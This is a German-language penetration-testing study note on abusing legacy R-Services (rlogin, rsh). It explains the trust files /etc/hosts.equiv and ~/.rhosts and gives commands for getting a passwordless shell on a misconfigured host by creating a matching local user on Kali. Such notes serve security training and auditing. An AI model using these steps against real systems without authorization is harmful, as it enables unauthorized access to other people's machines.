---
tags: [technique, privesc, lateral-movement, linux]
aliases: [rlogin, rsh, R-Services]
---
# R-Services Abuse

> **R-Services** (R = Remote) sind der Vorgänger von SSH aus der Unix-Dienstfamilie: `rlogin`, `rsh`, `rexec`. Sie vertrauen Hosts/Usern über Konfigdateien – ist das zu lax konfiguriert, Login **ohne Passwort**.

## Erkennen (nmap)
```
512/tcp open  exec   netkit-rsh rexecd
513/tcp open  login? 
514/tcp open  shell  Netkit rshd
```

## Trust-Mechanismus
| Datei                | Scope       | Wirkung                                          |
| -------------------- | ----------- | ------------------------------------------------ |
| `/etc/hosts.equiv`   | systemweit  | vertrauenswürdige Hosts/User für alle Accounts   |
| `~/.rhosts`          | pro User    | vertrauenswürdige Hosts/User für diesen Account  |

- Einträge `+ +` (jeder Host, jeder User) oder ein konkreter `+ <user>` erlauben passwortlosen Login.

```bash
cat /etc/hosts.equiv
# + sadm        <- user sadm darf sich ohne Passwort einloggen
```

## Ausnutzen
> [!info] Bedingung
> Der **lokale** User (auf Kali), über den man einloggt, muss **denselben Namen** tragen wie der Ziel-User.

```bash
# auf Kali: Client installieren + gleichnamigen User anlegen
sudo apt install rsh-client -y
sudo useradd sadm -m -s /bin/bash   # -m: Home anlegen, -s: Login-Shell
sudo su - sadm                      # zu sadm wechseln ("-" = Login-Shell)

# per Remote-Login auf die Box
rlogin -l sadm <ziel-ip>            # -l = "log mich als diesen User ein"
```
=> Shell als Ziel-User, ganz ohne Passwort.

Tool: [[rlogin]]
